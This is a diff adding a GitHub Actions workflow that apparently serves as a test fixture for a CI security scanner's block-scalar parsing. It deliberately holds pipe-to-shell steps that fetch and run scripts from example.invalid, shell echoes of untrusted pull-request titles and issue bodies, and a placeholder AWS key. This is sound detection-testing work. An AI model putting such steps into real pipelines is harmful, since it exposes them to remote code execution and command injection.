@@ -1,0 +1,46 @@
+# run: as a block scalar, which is how most real scripts are written. A parser
+# that reads line by line off the raw source matches nothing here, and a rule
+# that regexes the resolved value matches all of it.
+#
+# Credentials in this file are pattern-matching fakes, not live keys:
+# AKIAIOSFODNN7EXAMPLE is the documentation example value. They exist so the
+# credential regexes in rules 5 and 9 have something to match.
+name: ci
+
+on: push
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      # Literal block scalar, the common case.
+      - name: literal
+        run: |
+          set -euo pipefail
+          export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+          echo "title is ${{ github.event.pull_request.title }}"
+          git log -p -n 50 > /tmp/history.txt
+
+      # Literal block scalar with the trailing newline stripped.
+      - name: literal-stripped
+        run: |-
+          curl https://example.invalid/install.sh | bash
+          echo done
+
+      # Folded block scalar. Lines are joined, so the rule sees one line.
+      - name: folded
+        run: >
+          echo one
+          echo two
+
+      # A single line, with a pipe character rather than a block.
+      - name: single-line
+        run: curl https://example.invalid/payload | sh
+
+      # Quoted, with an escape, on one line.
+      - name: quoted
+        run: "echo \"${{ github.event.issue.body }}\""
+
+      # Empty run, which GitHub rejects but a scanner should survive.
+      - name: empty
+        run: ''
